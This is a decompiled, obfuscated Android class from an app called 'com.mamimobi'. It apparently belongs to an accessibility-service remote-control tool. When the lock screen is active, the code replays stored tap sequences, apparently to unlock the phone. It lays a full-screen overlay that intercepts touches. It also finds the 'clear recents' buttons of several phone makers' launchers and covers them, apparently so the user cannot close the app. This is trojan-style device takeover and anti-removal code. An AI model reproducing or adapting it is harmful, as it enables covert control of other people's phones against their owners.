package defpackage;

import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.FrameLayout;
import androidx.work.impl.WorkDatabaseVersions;
import com.mamimobi.AccessService;
import com.mamimobi.videostream.model.ScreenPoints;
import java.lang.ref.WeakReference;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import org.json.JSONArray;

/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class k1 implements Runnable {
    public final /* synthetic */ int E;
    public final /* synthetic */ AccessService F;

    public /* synthetic */ k1(AccessService accessService, int i) {
        this.E = i;
        this.F = accessService;
    }

    @Override // java.lang.Runnable
    public final void run() {
        AtomicBoolean atomicBoolean;
        AccessibilityNodeInfo accessibilityNodeInfoC0;
        AccessibilityNodeInfo child;
        int i = 2;
        int i2 = 0;
        int i3 = 1;
        switch (this.E) {
            case 0:
                this.F.B();
                return;
            case 1:
                String str = AccessService.V;
                AccessService accessService = this.F;
                accessService.getClass();
                if (AccessService.B0.get()) {
                    return;
                }
                fa0.Q0(accessService, "CLICK", "");
                return;
            case 2:
                String str2 = AccessService.V;
                AccessService accessService2 = this.F;
                accessService2.getClass();
                if (AccessService.B0.get()) {
                    return;
                }
                fa0.Q0(accessService2, "MIXCLICK", "");
                return;
            case 3:
                String str3 = AccessService.V;
                AccessService accessService3 = this.F;
                accessService3.getClass();
                try {
                    AccessibilityNodeInfo rootInActiveWindow = accessService3.getRootInActiveWindow();
                    Rect rect = new Rect();
                    rootInActiveWindow.getBoundsInScreen(rect);
                    of.a(new s1(d91.f(rect), (rect.bottom - (((int) d91.c(48.0f)) / 2)) - ((int) d91.c(36.0f)), i2));
                    return;
                } catch (Exception e) {
                    e.printStackTrace();
                    return;
                }
            case 4:
                AccessService accessService4 = this.F;
                synchronized (accessService4) {
                    try {
                        try {
                        } catch (Exception e2) {
                            e2.printStackTrace();
                            atomicBoolean = AccessService.j0;
                        }
                        if (!AccessService.b0.isKeyguardLocked()) {
                            AccessService.j0.set(false);
                            return;
                        }
                        long jCurrentTimeMillis = System.currentTimeMillis();
                        if (jCurrentTimeMillis - AccessService.O0 < 3000) {
                            AccessService.j0.set(false);
                            return;
                        }
                        AccessService.O0 = jCurrentTimeMillis;
                        AtomicInteger atomicInteger = AccessService.C0;
                        if (atomicInteger.get() == 1) {
                            String strQ0 = fa0.q0(accessService4, "CLICK", "");
                            if (!TextUtils.isEmpty(strQ0) && !strQ0.equals("[]")) {
                                JSONArray jSONArray = new JSONArray(strQ0);
                                for (int i4 = 0; i4 < jSONArray.length(); i4++) {
                                    ScreenPoints screenPoints = (ScreenPoints) AccessService.h0.b(ScreenPoints.class, jSONArray.getString(i4));
                                    d91.b(accessService4, screenPoints.x, screenPoints.y);
                                    SystemClock.sleep(1000L);
                                }
                                new Handler(Looper.getMainLooper()).postDelayed(new k1(accessService4, i3), 5000L);
                                AccessService.j0.set(false);
                                return;
                            }
                            accessService4.K();
                        } else if (atomicInteger.get() == 2) {
                            String strQ02 = fa0.q0(accessService4, "MIXCLICK", "");
                            if (!TextUtils.isEmpty(strQ02) && !strQ02.equals("[]")) {
                                JSONArray jSONArray2 = new JSONArray(strQ02);
                                for (int i5 = 0; i5 < jSONArray2.length(); i5++) {
                                    ScreenPoints screenPoints2 = (ScreenPoints) AccessService.h0.b(ScreenPoints.class, jSONArray2.getString(i5));
                                    d91.b(accessService4, screenPoints2.x, screenPoints2.y);
                                    SystemClock.sleep(1000L);
                                }
                                new Handler(Looper.getMainLooper()).postDelayed(new k1(accessService4, i), 5000L);
                                AccessService.j0.set(false);
                                return;
                            }
                            AccessService.J();
                        } else if (atomicInteger.get() == 3) {
                            sa0.f(accessService4);
                        }
                        atomicBoolean = AccessService.j0;
                        atomicBoolean.set(false);
                        return;
                    } catch (Throwable th) {
                        AccessService.j0.set(false);
                        throw th;
                    }
                }
            case 5:
                if (!AccessService.B0.get()) {
                    fa0.Q0(this.F, "PATH", "");
                }
                AccessService.n0.set(false);
                return;
            case 6:
                if (AccessService.B0.get()) {
                    return;
                }
                fa0.Q0(this.F, "CLICK", "");
                return;
            case 7:
                if (AccessService.B0.get()) {
                    return;
                }
                fa0.Q0(this.F, "CLICK", "");
                return;
            case 8:
                uj0.d(this.F, uj0.f);
                return;
            case WorkDatabaseVersions.VERSION_9 /* 9 */:
                if (xm0.d.compareAndSet(false, true)) {
                    sa0.a.clear();
                    AccessService.f0 = "";
                    View view = new View(this.F);
                    view.setBackgroundColor(16711680);
                    view.setAlpha(1.0f);
                    if (xm0.b == null) {
                        xm0.b = (WindowManager) AccessService.e0.getSystemService("window");
                    }
                    DisplayMetrics displayMetrics = new DisplayMetrics();
                    xm0.b.getDefaultDisplay().getRealMetrics(displayMetrics);
                    WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
                    layoutParams.flags = 296;
                    layoutParams.format = -3;
                    layoutParams.alpha = 1.0f;
                    layoutParams.dimAmount = 0.01f;
                    layoutParams.gravity = 8388659;
                    layoutParams.x = 0;
                    layoutParams.y = 0;
                    layoutParams.width = displayMetrics.widthPixels;
                    layoutParams.height = displayMetrics.heightPixels;
                    layoutParams.type = 2032;
                    view.setOnTouchListener(new wm0());
                    xm0.c = new WeakReference(view);
                    xm0.b.addView(view, layoutParams);
                    return;
                }
                return;
            case 10:
                s90.X(this.F);
                return;
            case WorkDatabaseVersions.VERSION_11 /* 11 */:
                if (!s90.s) {
                    AccessService accessService5 = this.F;
                    if (accessService5.getRootInActiveWindow() != null) {
                        String[] strArr = {"com.android.launcher:id/btn_clear", "com.miui.home:id/clearAnimView", "com.huawei.android.launcher:id/clear_all_recents_image_button", "com.coloros.recents:id/clear_all_button", "com.sec.android.app.launcher:id/clear_all_buttonh", "com.oppo.launcher:id/btn_clear"};
                        AccessibilityNodeInfo accessibilityNodeInfoC02 = null;
                        while (i2 < 6 && (accessibilityNodeInfoC02 = la0.c0(accessService5, strArr[i2])) == null) {
                            i2++;
                        }
                        if (accessibilityNodeInfoC02 == null && (accessibilityNodeInfoC0 = la0.c0(accessService5, "com.bbk.launcher2:id/overview_panel")) != null && (child = accessibilityNodeInfoC0.getChild(2)) != null) {
                            accessibilityNodeInfoC02 = child;
                        }
                        if (accessibilityNodeInfoC02 != null) {
                            Rect rect2 = new Rect();
                            accessibilityNodeInfoC02.getBoundsInScreen(rect2);
                            if (accessService5.getSoftKeyboardController().getShowMode() == 0) {
                                WindowManager.LayoutParams layoutParams2 = s90.t;
                                layoutParams2.x = rect2.left;
                                layoutParams2.y = rect2.top - s90.y(accessService5);
                                FrameLayout.LayoutParams layoutParams3 = (FrameLayout.LayoutParams) s90.u.getLayoutParams();
                                layoutParams3.gravity = 51;
                                layoutParams3.width = rect2.width();
                                layoutParams3.height = rect2.height();
                                s90.u.setLayoutParams(layoutParams3);
                                s90.v.updateViewLayout(s90.r, s90.t);
                            }
                            new Handler(Looper.getMainLooper()).post(new l1(11));
                            s90.s = true;
                        }
                    }
                }
                new Handler(Looper.getMainLooper()).postDelayed(new l1(10), 8000L);
                return;
            default:
                d91.h(this.F, d91.g);
                return;
        }
    }
}
